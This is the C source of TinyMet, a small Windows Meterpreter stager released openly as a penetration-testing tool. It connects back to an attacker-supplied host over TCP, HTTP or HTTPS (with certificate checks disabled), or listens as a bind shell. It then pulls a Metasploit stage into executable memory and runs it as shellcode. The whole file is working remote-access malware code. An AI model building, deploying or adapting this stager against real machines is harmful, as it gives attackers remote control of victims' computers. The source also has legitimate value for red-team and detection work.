//بسم الله الرحمن الرحيم
/************************************************
*				  [TinyMet v0.2]					*
*		The Tiny Meterpreter Executable		*
*************************************************
- @SheriefEldeeb
- http://tinymet.com
- http://eldeeb.net
- Made in Egypt :)
************************************************/
/*
Copyright (c) 2015, Sherif Eldeeb "eldeeb.net"
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
* Redistributions of source code must retain the above copyright
notice, this list of conditions and the following disclaimer.
* Redistributions in binary form must reproduce the above copyright
notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution.
* Neither the name of the <organization> nor the
names of its contributors may be used to endorse or promote products
derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#include <WinSock2.h>
#include <Wininet.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "wininet.lib")

// Globals ...
unsigned long hostip;
unsigned short portnumber;
unsigned char *buf;
unsigned int bufsize;


// Functions ...
void err_exit(char* message){
	printf("\nError: %s\nGetLastError:%d", message, GetLastError());
	exit(-1);
}

void gen_random(char* s, const int len) { // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum)-1)];
	}

	s[len] = 0;
}

int text_checksum_8(char* text)
{
	UINT temp = 0;
	for (UINT i = 0; i < strlen(text); i++)
	{
		temp += (int)text[i];
	}
	return temp % 0x100;
}

unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
{

	WSADATA wsaData;

	SOCKET sckt;
	SOCKET cli_sckt;
	SOCKET buffer_socket;

	struct sockaddr_in server;
	hostent *hostName;
	int length = 0;
	int location = 0;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
		err_exit("WSAStartup");
	}

	hostName = gethostbyname(host);

	if (hostName == nullptr){
		err_exit("gethostbyname");
	}

	hostip = *(unsigned long*)hostName->h_addr_list[0];
	portnumber = htons(atoi(port));

	server.sin_addr.S_un.S_addr = hostip;
	server.sin_family = AF_INET;
	server.sin_port = portnumber;

	sckt = socket(AF_INET, SOCK_STREAM, NULL);

	if (sckt == INVALID_SOCKET){
		err_exit("socket()");
	}

	//////////////////////////////
	if (bind_tcp){
		if (bind(sckt, (struct sockaddr *)&server, sizeof(struct sockaddr)) != 0) {
			err_exit("bind()");
		}
		if (listen(sckt, SOMAXCONN) != 0) {
			err_exit("listen()");
		}
		if ((cli_sckt = accept(sckt, NULL, NULL)) == INVALID_SOCKET)
		{
			err_exit("accept()");
		}
		buffer_socket = cli_sckt;
	}
	//
	else {
		if (connect(sckt, (sockaddr*)&server, sizeof(server)) != 0){
			err_exit("connect()");
		}
		buffer_socket = sckt;
	}
	//////////////////////////////
	// When reverse_tcp and bind_tcp are used, the multi/handler sends the size of the stage in the first 4 bytes before the stage itself
	// So, we read first 4 bytes to use it for memory allocation calculations 
	recv(buffer_socket, (char*)&bufsize, 4, 0); // read first 4 bytes = stage size
	
	buf = (unsigned char*)VirtualAlloc(buf, bufsize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	// Q: why did we allocate bufsize+5? what's those extra 5 bytes?
	// A: the stage is a large shellcode "ReflectiveDll", and when the stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER IN _EDI_ register.
	//    so, we want the following to take place BEFORE executing the stage: "mov edi, [socket]"
	//    opcode for "mov edi, imm32" is 0xBF

	buf[0] = 0xbf; // opcode of "mov edi, [WhateverFollows]
	memcpy(buf + 1, &buffer_socket, 4); // got it?

	length = bufsize;
	while (length != 0){
		int received = 0;
		received = recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0);
		location = location + received;
		length = length - received;
	}
	//////////////////////////////
	return buf;
}

unsigned char* rev_http(char* host, char* port, bool WithSSL){
	// Steps:
	//	1) Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
	//	3) Prepare buffer for the stage with WinInet: InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
	//	4) Return pointer to the populated buffer to caller function.
	//***************************************************************//

	// Variables
	char uri[5] = { 0 };			//4 chars ... it can be any length actually.
	char fullurl[6] = { 0 };	// fullurl is ("/" + URI)
	unsigned char* buffer = nullptr;
	DWORD flags = 0;
	int dwSecFlags = 0;

	//	Step 1: Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
	int checksum = 0;
	srand(GetTickCount());
	while (true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
	{
		gen_random(uri, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
		checksum = text_checksum_8(uri);	//Get the 8-bit checksum of the random value
		if (checksum == 92)		//If the checksum == 92, it will be handled by the multi/handler correctly as a "INITM" and will send over the stage.
		{
			break; // We found a random string that checksums to 98
		}
	}
	strcpy(fullurl, "/");
	strcat(fullurl, uri);

	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
	if (WithSSL) {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA);
	}
	else {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
	}

	//	3) Prepare buffer for the stage with WinInet:
	//	   InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.

	//	3.1: HINTERNET InternetOpen(_In_  LPCTSTR lpszAgent, _In_  DWORD dwAccessType, _In_  LPCTSTR lpszProxyName, _In_  LPCTSTR lpszProxyBypass, _In_  DWORD dwFlags);
	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	if (hInternetOpen == NULL){
		err_exit("InternetOpen()");
	}

	// 3.2: InternetConnect
	HINTERNET hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	if (hInternetConnect == NULL){
		err_exit("InternetConnect()");
	}

	// 3.3: HttpOpenRequest
	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", fullurl, NULL, NULL, NULL, flags, NULL);
	if (hHTTPOpenRequest == NULL){
		err_exit("HttpOpenRequest()");
	}

	// 3.4: if (SSL)->InternetSetOption 
	if (WithSSL){
		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
		InternetSetOption(hHTTPOpenRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
	}

	// 3.5: HttpSendRequest 
	if (!HttpSendRequest(hHTTPOpenRequest, NULL, NULL, NULL, NULL))
	{
		err_exit("HttpSendRequest()");
	}

	// 3.6: VirtualAlloc enough memory for the stage ... 4MB are more than enough
	buffer = (unsigned char*)VirtualAlloc(NULL, (4 * 1024 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// 3.7: InternetReadFile: keep reading till nothing is left.

	BOOL keepreading = true;
	DWORD bytesread = -1;
	DWORD byteswritten = 0;
	while (keepreading && bytesread != 0)
	{
		keepreading = InternetReadFile(hHTTPOpenRequest, (buffer + byteswritten), 4096, &bytesread);
		byteswritten += bytesread;
	}

	//	4) Return pointer to the populated buffer to caller function.
	return buffer;
}

char* wchar_to_char(wchar_t* orig){
	size_t origsize = wcslen(orig) + 1;
	const size_t newsize = origsize * 2;
	char *nstring = (char*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
	wcstombs(nstring, orig, origsize);
	return nstring;
}

int main()
{
	LPWSTR *arglist;
	int argsCount;
	char helptext[] = "TinyMet v0.1\nwww.tinymet.com\n\n"
		"Usage: tinymet.exe [transport] LHOST LPORT\n"
		"Available transports are as follows:\n"
		"    0: reverse_tcp\n"
		"    1: reverse_http\n"
		"    2: reverse_https\n"
		"    3: bind_tcp\n"
		"\nExample:\n"
		"\"tinymet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n";

	arglist = CommandLineToArgvW(GetCommandLineW(), &argsCount);

	// rudimentary error checking
	if (NULL == arglist) { // problem parsing?
		err_exit("CommandLineToArgvW & GetCommandLineW");
	}
	else if (argsCount == 2 && !wcscmp(arglist[1], L"--help")){ // looking for help?
		printf(helptext);
		exit(-1);
	}
	else if (argsCount != 4){ // less than 4 args?
		printf(helptext);
		err_exit("Invalid arguments count, should be 4");
	}

	// convert wchar_t to mb
	char* TRANSPORT = wchar_to_char(arglist[1]);
	char* LHOST = wchar_to_char(arglist[2]);
	char* LPORT = wchar_to_char(arglist[3]);

	printf("T:%s H:%s P:%s\n", TRANSPORT, LHOST, LPORT);

	// pick transport ...
	switch (TRANSPORT[0]) {
	case '0':
		buf = met_tcp(LHOST, LPORT, FALSE);
		break;
	case '1':
		buf = rev_http(LHOST, LPORT, FALSE);
		break;
	case '2':
		buf = rev_http(LHOST, LPORT, TRUE);
		break;
	case '3':
		buf = met_tcp(LHOST, LPORT, TRUE);
		break;
	default:
		printf(helptext);
		err_exit("Transport should be 0,1,2 or 3"); // transport is not valid
	}

	(*(void(*)())buf)();
	exit(0);
}

